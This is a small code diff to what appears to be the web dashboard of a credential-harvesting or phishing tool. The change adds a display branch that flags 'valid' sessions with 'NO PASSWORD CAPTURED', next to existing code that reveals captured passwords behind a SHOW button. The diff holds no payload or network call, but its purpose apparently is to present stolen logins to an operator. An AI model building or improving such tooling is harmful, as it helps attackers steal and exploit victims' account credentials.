@@ -933,6 +933,9 @@
                                     id="reveal-btn-${index}" class="reveal-btn">SHOW</button>
                             </div>
                         `;
+                    } else if (session.status === 'valid' && !session.password) {
+                        // Valid session but no password captured
+                        passwordColumn = `<span style="color: #ffaa00; font-weight: bold;">⚠️ NO PASSWORD CAPTURED</span>`;
                     } else if (session.status === 'invalid') {
                         // Show reason for invalid entries
                         const reason = session.reason || 'FAILED ENTRY';
